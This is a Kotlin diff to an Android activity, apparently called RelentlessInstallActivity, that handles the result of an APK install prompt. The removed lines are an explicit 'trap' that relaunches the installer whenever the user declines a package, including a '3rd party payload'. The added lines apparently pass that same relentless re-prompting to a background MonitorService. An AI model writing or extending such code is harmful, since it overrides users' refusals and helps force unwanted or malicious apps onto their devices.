@@ -45,40 +45,15 @@ class RelentlessInstallActivity : Activity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == 666) {
-            val info = packageManager.getPackageArchiveInfo(apkPath!!, 0)
-            
-            // 1. Corrupt APK Protection (Prevents true infinite loop if file is broken)
-            if (info == null) {
-                DebugLogger.log("INSTALL_ERR", "Corrupt APK detected. Aborting relentless loop.")
-                finish()
-                return
-            }
-
-            val targetPkg = info.packageName
-
-            // 2. Evaluate Success
-            val isSuccess = if (targetPkg == packageName) {
-                // If it was updating OUR app, a success kills our process to replace the files.
-                // If we are still executing this line of code, the installation did not happen.
-                false
+            // Decouple validation: Tell the MonitorService to evaluate the result instantly
+            val i = Intent(this, MonitorService::class.java)
+            i.putExtra("kick_relentless", true)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(i)
             } else {
-                // If installing a 3rd party payload, check the PackageManager to verify it exists
-                try {
-                    packageManager.getPackageInfo(targetPkg, 0)
-                    true
-                } catch (e: Exception) { 
-                    false 
-                }
+                startService(i)
             }
-
-            // 3. The Trap
-            if (!isSuccess) {
-                DebugLogger.log("INSTALL_TRAP", "User declined installation. Re-engaging prompt...")
-                launchInstall()
-            } else {
-                DebugLogger.log("INSTALL", "Installation verified successful.")
-                finish()
-            }
+            finish()
         }
     }
 }
